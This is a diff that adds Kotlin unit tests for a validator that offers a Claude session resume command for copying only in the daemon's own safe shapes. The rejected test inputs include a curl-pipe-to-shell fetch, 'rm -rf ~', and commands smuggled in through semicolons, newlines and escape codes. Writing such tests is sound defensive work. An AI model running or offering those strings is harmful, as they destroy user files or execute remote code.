@@ -246,3 +246,53 @@ class ArchiveTest {
         assertEquals("DELETE", seen.last().method.value)
     }
 }
+
+/**
+ * A resume command is offered for copying only in the shapes the daemon builds,
+ * because a person pastes it into a terminal. The accepted strings are the
+ * daemon's own output (`lib/archive.js` resumeCommand) for these folders.
+ */
+class ResumeCommandShapeTest {
+    private val id = "0123abcd-0000-4000-8000-00000000abcd"
+
+    @Test
+    fun `the daemon's own commands are offered as they are`() {
+        for (cmd in listOf(
+            "claude --resume $id",
+            "cd '/root/projects/app' && claude --resume $id",
+            "cd '/tmp/it'\\''s here' && claude --resume $id",
+            "cd '/srv/\$(echo x)/a b' && claude --resume $id",
+            "cd 'C:\\Users\\me' && claude --resume $id",
+        )) {
+            assertEquals(cmd, ArchiveRules.safeResumeCommand(cmd), cmd)
+        }
+    }
+
+    @Test
+    fun `anything that would run more than a resume is not offered`() {
+        for (cmd in listOf(
+            "claude --resume $id; curl https://example.com/x | sh",
+            "claude --resume $id && rm -rf ~",
+            "cd /root && claude --resume $id",
+            "cd '/x'; touch y; echo '' && claude --resume $id",
+            "cd '/x' && rm -rf ~ && claude --resume $id",
+            "cd '/x\nrm -rf ~' && claude --resume $id",
+            "cd '/x\u001b[2J' && claude --resume $id",
+            "claude --resume not-a-uuid",
+            "claude --resume ${id}0",
+            " claude --resume $id",
+            "",
+        )) {
+            assertNull(ArchiveRules.safeResumeCommand(cmd), cmd)
+        }
+        assertNull(ArchiveRules.safeResumeCommand(null))
+    }
+
+    @Test
+    fun `a row with a command of another shape offers no copy`() {
+        val ok = ArchivedSession(id = "a1", resumeCommand = "claude --resume $id")
+        val bad = ArchivedSession(id = "a2", resumeCommand = "claude --resume $id; id")
+        assertEquals("claude --resume $id", ArchiveRules.resumeCommandOf(ok))
+        assertNull(ArchiveRules.resumeCommandOf(bad))
+    }
+}
